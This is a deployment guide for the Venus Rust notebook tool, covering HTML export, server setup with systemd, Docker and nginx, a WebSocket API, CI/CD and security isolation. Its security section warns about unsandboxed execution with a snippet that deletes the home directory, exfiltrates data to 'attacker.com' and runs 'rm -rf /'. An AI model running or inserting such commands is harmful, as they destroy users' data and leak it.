# Deployment Guide

This guide covers deploying Venus notebooks for production use, sharing with others, and building custom applications.

## Deployment Options

Venus provides multiple deployment strategies depending on your needs:

1. **Standalone HTML** - Self-contained file for sharing results
2. **Web Server** - Live interactive notebook with the built-in UI
3. **Custom Frontend** - Build your own UI using the Venus API
4. **Standalone Binary** - Compiled executable for distribution

## 1. Standalone HTML Export

Export your notebook as a single HTML file with embedded outputs.

### Basic Export

```bash
venus export notebook.rs
```

This creates `notebook.html` containing:
- All cell code and outputs
- Markdown cells (rendered)
- Execution results
- No interactivity (read-only)

### Use Cases

- Sharing analysis results with colleagues
- Publishing to static site (GitHub Pages, S3)
- Archiving notebook state
- Email attachments

### Deployment

```bash
# Deploy to static hosting
cp notebook.html /var/www/html/

# Or upload to cloud storage
aws s3 cp notebook.html s3://my-bucket/reports/
```

## 2. Venus Server Deployment

Run the Venus server in production for interactive notebooks.

### Development

```bash
venus serve notebook.rs
# Listens on http://127.0.0.1:8080
```

### Production

For production deployment, you'll need to handle:

1. **Process Management** (systemd, Docker, etc.)
2. **Reverse Proxy** (nginx, caddy)
3. **Authentication** (currently not built-in)
4. **TLS/HTTPS** (via reverse proxy)

### Systemd Service

```ini
# /etc/systemd/system/venus.service
[Unit]
Description=Venus Notebook Server
After=network.target

[Service]
Type=simple
User=venus
WorkingDirectory=/opt/venus
ExecStart=/usr/local/bin/venus serve /opt/venus/notebook.rs
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

```bash
# Enable and start
sudo systemctl enable venus
sudo systemctl start venus
```

### Docker Deployment

```dockerfile
FROM rust:latest

WORKDIR /app
COPY notebook.rs .

# Install Venus
RUN cargo install venus-cli

# Expose server port
EXPOSE 8080

CMD ["venus", "serve", "notebook.rs"]
```

```bash
# Build and run
docker build -t my-venus-notebook .
docker run -p 8080:8080 my-venus-notebook
```

### Reverse Proxy (nginx)

```nginx
server {
    listen 80;
    server_name notebook.example.com;

    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # WebSocket timeout
        proxy_read_timeout 86400;
    }
}
```

**Important**: Venus currently has no built-in authentication. Use a reverse proxy with auth middleware (nginx basic auth, OAuth proxy, etc.) for security.

## 3. Custom Frontend with Venus API

Build your own UI using the Venus server API.

### Why Custom Frontend?

- **Branding**: Match your company/project design
- **Integration**: Embed notebooks in existing applications
- **Specialized UX**: Domain-specific interfaces (dashboards, reports, etc.)
- **Mobile**: Responsive or native mobile apps
- **Automation**: Programmatic notebook control

### Architecture

```
┌─────────────────┐
│ Custom Frontend │  (Your React/Vue/Svelte app)
│  (Port 3000)    │
└────────┬────────┘
         │ WebSocket
         │
┌────────▼────────┐
│  Venus Server   │  (Built-in backend)
│  (Port 8080)    │
└─────────────────┘
```

### Quick Start

The Venus server exposes a WebSocket API at `/ws`. See the [API Reference](api.md) for complete documentation.

**Minimal Example**:

```javascript
const ws = new WebSocket('ws://localhost:8080/ws');

// Server sends initial state on connection
ws.onmessage = (e) => {
  const msg = JSON.parse(e.data);
  console.log('Server:', msg);
};

// Execute a cell
ws.send(JSON.stringify({
  type: 'execute_cell',
  cell_id: 1
}));
```

### Reference Implementation

The built-in frontend is located at `crates/venus-server/src/frontend/`. You can use it as reference:
- WebSocket client setup
- State management
- Monaco editor integration
- Markdown rendering

### API Documentation

See [API Reference](api.md) for:
- Complete WebSocket protocol
- REST endpoints
- Message schemas
- Example clients

### Production Considerations

When building a custom frontend:

1. **CORS**: Venus server has permissive CORS enabled
2. **WebSocket Reconnection**: Implement reconnect logic
3. **State Sync**: Server broadcasts updates to all clients
4. **Error Handling**: All operations return error fields
5. **Authentication**: Implement auth at reverse proxy level

## 4. Standalone Binary

Build a standalone executable that bundles the notebook logic.

### Build for Release

```bash
venus build notebook.rs --release
```

This creates an optimized binary using LLVM backend (slower compilation, faster runtime).

### Output

- Binary: `target/release/notebook` (or `notebook.exe` on Windows)
- Can be distributed without Rust toolchain
- Runs notebook logic, exports results to stdout

### Use Cases

- CLI tools from notebook code
- Automated reports (cron jobs)
- CI/CD integration
- Distribution to non-technical users

### Deployment

```bash
# Copy binary to production
scp target/release/notebook server:/usr/local/bin/

# Run on server
./notebook > report.txt
```

## CI/CD Integration

### GitHub Actions

```yaml
name: Run Notebook

on: [push, pull_request]

jobs:
  notebook:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Install Rust
        uses: dtolnay/rust-toolchain@stable

      - name: Install Venus
        run: cargo install venus-cli

      - name: Run Notebook
        run: venus run analysis.rs

      - name: Export Results
        run: venus export analysis.rs

      - name: Upload HTML
        uses: actions/upload-artifact@v3
        with:
          name: notebook-output
          path: analysis.html
```

### Scheduled Execution

```yaml
# .github/workflows/scheduled-report.yml
on:
  schedule:
    - cron: '0 0 * * *'  # Daily at midnight

jobs:
  report:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Install Venus
        run: cargo install venus-cli
      - name: Generate Report
        run: venus run daily_report.rs > report.txt
      - name: Send Email
        uses: dawidd6/action-send-mail@v3
        with:
          server_address: smtp.gmail.com
          server_port: 465
          username: ${{ secrets.MAIL_USERNAME }}
          password: ${{ secrets.MAIL_PASSWORD }}
          subject: Daily Report
          body: file://report.txt
```

## Jupyter Notebook Export

Convert Venus notebooks to `.ipynb` format for compatibility.

### Generate .ipynb

```bash
venus sync notebook.rs
```

Creates `notebook.ipynb` with:
- All cells preserved
- Cached outputs embedded
- GitHub preview support
- Compatible with JupyterLab/VSCode

### Use Cases

- Sharing on GitHub (automatic notebook rendering)
- Opening in JupyterLab
- Collaboration with Python users
- Version control with git

### Deployment

```bash
# Add to git
git add notebook.ipynb
git commit -m "Add notebook results"
git push

# GitHub automatically renders .ipynb files
```

## Security Considerations

### ⚠️ CRITICAL: Venus is NOT for Production

**Venus is designed for local development, testing, and learning environments ONLY.**

Venus executes arbitrary Rust code with ZERO sandboxing or isolation:
- ✅ Full filesystem access (can delete `/`, read `/etc/passwd`)
- ✅ Full network access (can exfiltrate data)
- ✅ Full process control (can spawn processes, fork bombs)
- ✅ Unrestricted system calls (any `unsafe` code)

**Running Venus is equivalent to running `cargo run` on untrusted code.**

### Responsibility Model

- **Individual users**: You are responsible for running Venus in a secure environment
- **Cloud providers**: YOU are responsible for isolation - Venus provides none
- **Venus**: Only executes code - does NOT secure execution

See [SECURITY.md](../SECURITY.md) for the complete security policy.

### For Cloud REPL Providers

If you're building a cloud-based Rust notebook service, **YOU MUST PROVIDE ISOLATION**:

#### Required Isolation (MANDATORY)

1. **Container/VM per user** - Full isolation between users
2. **Resource limits** - CPU, memory, disk, process count
3. **Network isolation** - Disable or restrict network access
4. **Filesystem isolation** - Read-only root, tmpfs for writes
5. **Execution timeouts** - Kill runaway notebooks
6. **User separation** - No shared state

**Minimum Docker example**:
```bash
docker run --rm \
  --network none \
  --memory 256m \
  --cpus 0.5 \
  --pids-limit 20 \
  --read-only \
  --tmpfs /tmp:size=100m \
  venus-container venus run notebook.rs
```

See [SECURITY.md](../SECURITY.md) for comprehensive isolation examples.

### For Individual Users

**Never run untrusted notebooks.** Only execute code you wrote or fully trust.

Venus cells can:
```rust
// Delete your files
std::fs::remove_dir_all(std::env::home_dir());

// Exfiltrate data
reqwest::get("https://attacker.com/?data=...");

// Spawn processes
std::process::Command::new("rm").args(["-rf", "/"]).spawn();
```

**There is no protection against malicious code.**

### Authentication

Venus has no built-in auth. For production:

1. **Reverse Proxy Auth**: nginx basic auth, OAuth2 proxy
2. **VPN**: Restrict network access
3. **Firewall**: Allow only trusted IPs

**Example with OAuth2 Proxy**:

```nginx
location / {
    auth_request /oauth2/auth;
    error_page 401 = /oauth2/sign_in;

    proxy_pass http://127.0.0.1:8080;
    # ... other proxy settings
}
```

### HTTPS

Always use HTTPS in production:

```nginx
server {
    listen 443 ssl http2;
    ssl_certificate /etc/letsencrypt/live/notebook.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/notebook.example.com/privkey.pem;

    # ... proxy settings
}
```

## Performance Tuning

### Compilation Backend

- **Cranelift** (default): Fast compilation (~1s), moderate runtime
- **LLVM** (`--release` flag): Slow compilation (~10s), fast runtime

Use Cranelift for development, LLVM for production builds.

### Server Resources

Recommended specs for production:
- **CPU**: 2+ cores
- **RAM**: 2GB minimum, 4GB+ for large notebooks
- **Disk**: 1GB for Venus + notebook outputs

### Scaling

Current limitations:
- Single notebook per server instance
- No multi-user support
- State is in-memory (lost on restart)

For multi-notebook deployment, run separate server instances per notebook (Docker/systemd).

## Monitoring

### Health Check

```bash
curl http://localhost:8080/health
```

Response:
```json
{"status":"ok","version":"0.1.0-beta.3"}
```

### Logs

Venus logs to stderr. Capture with your process manager:

```bash
# Systemd
journalctl -u venus -f

# Docker
docker logs -f container_name
```

## Troubleshooting

### Server won't start

**Check port availability**:
```bash
lsof -i :8080
```

**Check file permissions**:
```bash
ls -l notebook.rs
```

### WebSocket connection fails

**CORS issues**: Check browser console
**Reverse proxy**: Ensure WebSocket upgrade headers are set
**Firewall**: Allow port 8080

### Execution errors

**Missing dependencies**: Ensure Cargo.toml includes all deps
**Compilation fails**: Check Rust toolchain version
**Permission denied**: Run server with appropriate user

## Future Enhancements

Planned features for better deployment:

- Built-in authentication
- Multi-notebook support
- Persistent state (database backend)
- Horizontal scaling
- API rate limiting
- Webhook notifications

## See Also

- [API Reference](api.md) - Build custom frontends
- [CLI Reference](cli.md) - Command-line usage
- [Getting Started](getting-started.md) - Notebook basics
